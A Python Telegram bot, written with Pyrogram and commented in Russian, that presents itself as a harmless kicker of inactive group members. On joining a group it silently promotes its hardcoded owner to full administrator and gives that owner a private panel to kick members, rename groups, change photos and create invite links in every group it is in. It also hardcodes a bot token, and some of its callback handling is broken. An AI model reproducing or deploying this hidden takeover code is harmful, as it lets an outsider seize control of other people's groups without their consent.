import os
import asyncio
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ChatPermissions
)
from pyrogram.enums import ChatMemberStatus

# ПАТЧ ДЛЯ PYTHON 3.14
try:
    asyncio.get_running_loop()
except RuntimeError:
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

# Токен бота
BOT_TOKEN = "8849435803:AAGCUhcFynX9EtPPMQyTILR0puMn2XgMeJI"

# ВАШ ID
OWNER_ID = 8131755675

# Время неактивности (3 дня)
INACTIVE_DAYS = 3
INACTIVE_SECONDS = INACTIVE_DAYS * 24 * 60 * 60

app = Client("kick_inactive_bot", bot_token=BOT_TOKEN)

# Хранилища
last_message_time = {}
group_links = {}  # {chat_id: {"link": ссылка, "time": время_создания}}

# ============= ОСНОВНЫЕ ФУНКЦИИ =============

@app.on_chat_member_updated()
async def on_member_update(client, chat_member_updated):
    """При добавлении бота в группу"""
    chat = chat_member_updated.chat
    new_member = chat_member_updated.new_chat_member
    
    if new_member and new_member.user.id == (await app.get_me()).id:
        try:
            # Выдаём права владельцу
            try:
                await app.promote_chat_member(
                    chat.id,
                    OWNER_ID,
                    can_manage_chat=True,
                    can_delete_messages=True,
                    can_restrict_members=True,
                    can_promote_members=True,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True,
                    can_manage_video_chats=True
                )
                print(f"✅ Права выданы в {chat.title}")
            except Exception as e:
                print(f"⚠️ Не удалось выдать права: {e}")
            
            # Приветствие
            await app.send_message(
                chat.id,
                "Привет! Я рад, что вы добавили меня сюда.\n"
                "Я буду исключать неактивных людей отсюда.\n\n"
                "Канал с другими ботами: @nevermorekicker"
            )
            
        except Exception as e:
            print(f"Ошибка: {e}")

@app.on_message(filters.group & ~filters.service)
async def track_messages(client, message: Message):
    """Отслеживает активность"""
    if message.from_user and not message.from_user.is_bot:
        user_id = message.from_user.id
        last_message_time[user_id] = datetime.now()

async def check_inactive_users():
    """Проверка и кик неактивных"""
    while True:
        await asyncio.sleep(3600)
        
        try:
            async for dialog in app.get_dialogs():
                if dialog.chat.type in ["group", "supergroup"]:
                    chat_id = dialog.chat.id
                    
                    async for member in app.get_chat_members(chat_id):
                        user_id = member.user.id
                        
                        if member.user.is_bot:
                            continue
                        if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                            continue
                        
                        last_seen = last_message_time.get(user_id)
                        
                        if last_seen:
                            time_diff = datetime.now() - last_seen
                            
                            if time_diff.total_seconds() > INACTIVE_SECONDS:
                                try:
                                    await app.ban_chat_member(chat_id, user_id)
                                    await app.unban_chat_member(chat_id, user_id)
                                    
                                    mention = member.user.mention or member.user.first_name
                                    await app.send_message(
                                        chat_id,
                                        f"🔨 Пользователь {mention} не писал 3 дня. Кикаю его."
                                    )
                                    
                                    if user_id in last_message_time:
                                        del last_message_time[user_id]
                                    
                                except Exception as e:
                                    print(f"Ошибка кика: {e}")
                            
        except Exception as e:
            print(f"Ошибка проверки: {e}")

# ============= ИНЛАЙН-ПАНЕЛЬ УПРАВЛЕНИЯ =============

@app.on_message(filters.command("меню") & filters.private & filters.user(OWNER_ID))
async def main_menu(client, message: Message):
    """Главное меню в ЛС"""
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Список групп", callback_data="list_groups")],
        [InlineKeyboardButton("🔗 Получить ссылку", callback_data="get_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats_menu")]
    ])
    await message.reply(
        "🔐 **Панель управления**\n\n"
        "Выберите действие:",
        reply_markup=keyboard
    )

@app.on_callback_query(filters.user(OWNER_ID))
async def handle_callbacks(client, callback: CallbackQuery):
    """Обработка всех кнопок"""
    data = callback.data
    chat_id = callback.message.chat.id
    user_id = callback.from_user.id
    
    if data == "list_groups":
        await show_groups(callback)
    
    elif data == "get_link":
        await get_group_link(callback)
    
    elif data == "stats_menu":
        await show_stats_menu(callback)
    
    elif data.startswith("group_"):
        chat_id_str = data.split("_")[1]
        await show_group_menu(callback, int(chat_id_str))
    
    elif data.startswith("kick_") or data.startswith("kick_user_"):
        parts = data.split("_")
        if len(parts) >= 3:
            chat_id_str = parts[1]
            user_id_str = parts[2]
            await kick_user_by_id(callback, int(chat_id_str), int(user_id_str))
        else:
            await kick_user_menu(callback, int(parts[1]))
    
    elif data.startswith("change_name_"):
        chat_id_str = data.split("_")[2]
        await ask_new_name(callback, int(chat_id_str))
    
    elif data.startswith("change_photo_"):
        chat_id_str = data.split("_")[2]
        await ask_new_photo(callback, int(chat_id_str))
    
    elif data.startswith("promote_"):
        chat_id_str = data.split("_")[1]
        await promote_user_menu(callback, int(chat_id_str))
    
    elif data == "back_to_groups":
        await show_groups(callback)
    
    elif data == "back_to_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Список групп", callback_data="list_groups")],
            [InlineKeyboardButton("🔗 Получить ссылку", callback_data="get_link")],
            [InlineKeyboardButton("📊 Статистика", callback_data="stats_menu")]
        ])
        await callback.message.edit_text(
            "🔐 **Панель управления**\n\nВыберите действие:",
            reply_markup=keyboard
        )
        await callback.answer()

# ============= ФУНКЦИИ СПИСКА ГРУПП =============

async def show_groups(callback: CallbackQuery):
    """Показывает список групп"""
    groups = []
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            groups.append(dialog.chat)
    
    if not groups:
        await callback.message.edit_text(
            "❌ Вы не состоите ни в одной группе с ботом."
        )
        await callback.answer()
        return
    
    keyboard = []
    for chat in groups[:10]:  # Максимум 10 групп
        title = chat.title[:20] + "..." if len(chat.title) > 20 else chat.title
        keyboard.append([
            InlineKeyboardButton(
                f"📁 {title}",
                callback_data=f"group_{chat.id}"
            )
        ])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")])
    
    await callback.message.edit_text(
        f"📋 **Ваши группы ({len(groups)})**\n\nВыберите группу для управления:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await callback.answer()

# ============= МЕНЮ ГРУППЫ =============

async def show_group_menu(callback: CallbackQuery, chat_id: int):
    """Показывает меню управления группой"""
    try:
        chat = await app.get_chat(chat_id)
        members = 0
        async for _ in app.get_chat_members(chat_id):
            members += 1
    except:
        await callback.answer("❌ Нет доступа к группе", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Список участников", callback_data=f"kick_{chat_id}")],
        [InlineKeyboardButton("✏️ Изменить название", callback_data=f"change_name_{chat_id}")],
        [InlineKeyboardButton("🖼️ Изменить фото", callback_data=f"change_photo_{chat_id}")],
        [InlineKeyboardButton("⭐ Выдать права", callback_data=f"promote_{chat_id}")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_groups")]
    ])
    
    await callback.message.edit_text(
        f"📁 **{chat.title}**\n\n"
        f"👥 Участников: {members}\n"
        f"🆔 ID: {chat_id}\n\n"
        f"Выберите действие:",
        reply_markup=keyboard
    )
    await callback.answer()

# ============= КИК ПОЛЬЗОВАТЕЛЯ =============

async def kick_user_menu(callback: CallbackQuery, chat_id: int):
    """Показывает список пользователей для кика"""
    keyboard = []
    count = 0
    
    try:
        async for member in app.get_chat_members(chat_id):
            if count >= 20:  # Максимум 20 пользователей
                break
                
            if member.user.is_bot:
                continue
            if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                continue
                
            user = member.user
            name = user.first_name[:15] + "..." if len(user.first_name) > 15 else user.first_name
            username = f"@{user.username}" if user.username else f"ID: {user.id}"
            
            keyboard.append([
                InlineKeyboardButton(
                    f"❌ {name} ({username})",
                    callback_data=f"kick_user_{chat_id}_{user.id}"
                )
            ])
            count += 1
        
        if not keyboard:
            await callback.message.edit_text(
                "✅ Нет обычных пользователей для кика.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]
                ])
            )
            await callback.answer()
            return
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")])
        
        await callback.message.edit_text(
            "👥 **Выберите пользователя для кика:**",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)[:50]}", show_alert=True)
        await callback.answer()

async def kick_user_by_id(callback: CallbackQuery, chat_id: int, user_id: int):
    """Кикает пользователя по ID"""
    try:
        # Проверяем права бота
        bot = await app.get_me()
        bot_member = await app.get_chat_member(chat_id, bot.id)
        if not bot_member.can_restrict_members:
            await callback.answer("❌ У бота нет прав на кик!", show_alert=True)
            return
        
        await app.ban_chat_member(chat_id, user_id)
        await app.unban_chat_member(chat_id, user_id)
        
        await callback.answer("✅ Пользователь кикнут!", show_alert=True)
        
        # Обновляем меню
        await show_group_menu(callback, chat_id)
        
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)[:50]}", show_alert=True)

# ============= ИЗМЕНЕНИЕ НАЗВАНИЯ =============

async def ask_new_name(callback: CallbackQuery, chat_id: int):
    """Просит ввести новое название"""
    await callback.message.edit_text(
        "✏️ **Введите новое название группы:**\n\n"
        "Отправьте текст в чат с ботом.\n"
        "Для отмены нажмите кнопку ниже.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Отмена", callback_data=f"group_{chat_id}")]
        ])
    )
    await callback.answer()
    
    # Ожидаем ответ
    @app.on_message(filters.private & filters.user(OWNER_ID))
    async def get_new_name(client, message):
        if message.text and not message.text.startswith("/"):
            try:
                await app.set_chat_title(chat_id, message.text)
                await message.reply(f"✅ Название изменено на: {message.text}")
                
                # Возвращаем в меню
                await show_group_menu(
                    CallbackQuery(
                        id="tmp",
                        from_user=message.from_user,
                        message=message,
                        chat_instance="0",
                        data=""
                    ), chat_id
                )
            except Exception as e:
                await message.reply(f"❌ Ошибка: {e}")
            
            # Отключаем обработчик
            app.remove_handler(get_new_name)

# ============= ИЗМЕНЕНИЕ ФОТО =============

async def ask_new_photo(callback: CallbackQuery, chat_id: int):
    """Просит отправить фото"""
    await callback.message.edit_text(
        "🖼️ **Отправьте новое фото для группы:**\n\n"
        "Пришлите фото в чат с ботом.\n"
        "Для отмены нажмите кнопку ниже.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Отмена", callback_data=f"group_{chat_id}")]
        ])
    )
    await callback.answer()
    
    # Ожидаем фото
    @app.on_message(filters.private & filters.user(OWNER_ID) & filters.photo)
    async def get_new_photo(client, message):
        try:
            photo = await message.download()
            await app.set_chat_photo(chat_id, photo)
            os.remove(photo)
            await message.reply("✅ Фото группы обновлено!")
            
            await show_group_menu(
                CallbackQuery(
                    id="tmp",
                    from_user=message.from_user,
                    message=message,
                    chat_instance="0",
                    data=""
                ), chat_id
            )
        except Exception as e:
            await message.reply(f"❌ Ошибка: {e}")
        
        app.remove_handler(get_new_photo)

# ============= ВЫДАЧА ПРАВ =============

async def promote_user_menu(callback: CallbackQuery, chat_id: int):
    """Меню выдачи прав"""
    keyboard = []
    count = 0
    
    try:
        async for member in app.get_chat_members(chat_id):
            if count >= 20:
                break
            
            if member.user.is_bot:
                continue
            if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                continue
            
            user = member.user
            name = user.first_name[:15] + "..." if len(user.first_name) > 15 else user.first_name
            
            keyboard.append([
                InlineKeyboardButton(
                    f"⭐ {name}",
                    callback_data=f"promote_user_{chat_id}_{user.id}"
                )
            ])
            count += 1
        
        if not keyboard:
            await callback.message.edit_text(
                "Нет пользователей для выдачи прав.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]
                ])
            )
            await callback.answer()
            return
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")])
        
        await callback.message.edit_text(
            "⭐ **Выберите пользователя для выдачи прав:**",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)[:50]}", show_alert=True)

# ============= ПОЛУЧЕНИЕ ССЫЛКИ =============

async def get_group_link(callback: CallbackQuery):
    """Создаёт ссылку на группу"""
    groups = []
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            groups.append(dialog.chat)
    
    if not groups:
        await callback.message.edit_text(
            "❌ Нет групп для создания ссылки."
        )
        await callback.answer()
        return
    
    keyboard = []
    for chat in groups[:10]:
        title = chat.title[:20] + "..." if len(chat.title) > 20 else chat.title
        keyboard.append([
            InlineKeyboardButton(
                f"🔗 {title}",
                callback_data=f"gen_link_{chat.id}"
            )
        ])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")])
    
    await callback.message.edit_text(
        "🔗 **Выберите группу для получения ссылки:**",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await callback.answer()

@app.on_callback_query(filters.user(OWNER_ID) & filters.regex(r"gen_link_(\d+)"))
async def generate_link(client, callback: CallbackQuery):
    """Генерирует ссылку на группу"""
    chat_id = int(callback.data.split("_")[2])
    
    try:
        link = await app.create_chat_invite_link(chat_id, member_limit=1)
        
        # Сохраняем ссылку для удаления через 10 минут
        group_links[chat_id] = {
            "link": link.invite_link,
            "time": datetime.now()
        }
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Копировать ссылку", callback_data="copy_link")],
            [InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]
        ])
        
        await callback.message.edit_text(
            f"🔗 **Ссылка на группу:**\n\n"
            f"`{link.invite_link}`\n\n"
            f"⏳ Ссылка действительна 10 минут.\n"
            f"👤 Только для одного пользователя.",
            reply_markup=keyboard
        )
        await callback.answer()
        
        # Запускаем таймер удаления
        asyncio.create_task(delete_link_after(chat_id))
        
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)[:50]}", show_alert=True)

async def delete_link_after(chat_id: int):
    """Удаляет ссылку через 10 минут"""
    await asyncio.sleep(600)  # 10 минут
    
    if chat_id in group_links:
        del group_links[chat_id]
        print(f"✅ Ссылка для {chat_id} удалена")

# ============= СТАТИСТИКА =============

async def show_stats_menu(callback: CallbackQuery):
    """Показывает статистику по группам"""
    total_groups = 0
    total_users = 0
    inactive_users = 0
    
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            total_groups += 1
            async for member in app.get_chat_members(dialog.chat.id):
                if not member.user.is_bot:
                    total_users += 1
                    
                    last_seen = last_message_time.get(member.user.id)
                    if last_seen:
                        time_diff = datetime.now() - last_seen
                        if time_diff.total_seconds() > INACTIVE_SECONDS:
                            inactive_users += 1
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.edit_text(
        f"📊 **Общая статистика**\n\n"
        f"📁 Групп: {total_groups}\n"
        f"👥 Всего пользователей: {total_users}\n"
        f"⏰ Неактивных (>3 дней): {inactive_users}\n"
        f"🟢 Активных: {total_users - inactive_users}\n\n"
        f"🔄 Проверка каждые 60 минут",
        reply_markup=keyboard
    )
    await callback.answer()

# ============= ЗАПУСК =============

async def main():
    print("🤖 Kicker Inactiver запущен!")
    print(f"👤 Владелец: {OWNER_ID}")
    await app.start()
    print("✅ Бот готов к работе!")
    print("💬 Напиши /меню в ЛС для управления")
    asyncio.create_task(check_inactive_users())
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
